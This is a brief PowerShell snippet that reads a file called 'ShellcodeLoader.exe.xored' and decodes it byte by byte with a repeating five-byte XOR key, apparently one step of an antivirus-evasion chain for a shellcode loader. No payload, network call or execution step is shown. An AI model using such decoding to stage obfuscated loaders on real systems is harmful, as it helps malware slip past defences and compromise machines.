$byteArray = [IO.File]::ReadAllBytes("$pwd\\ShellcodeLoader.exe.xored"); 
$KeyArray = @(90, 15, 69, 23, 21); 
$keyposition = 0; 
for ($i = 0; $i -lt $byteArray.count; $i++) 
{ 
    $byteArray[$i] = $byteArray[$i] -bxor $KeyArray[$keyposition]; 
    $keyposition += 1; 
    if ($keyposition -eq $keyArray.Length) { 
        $keyposition = 0 ; 
          } 
}
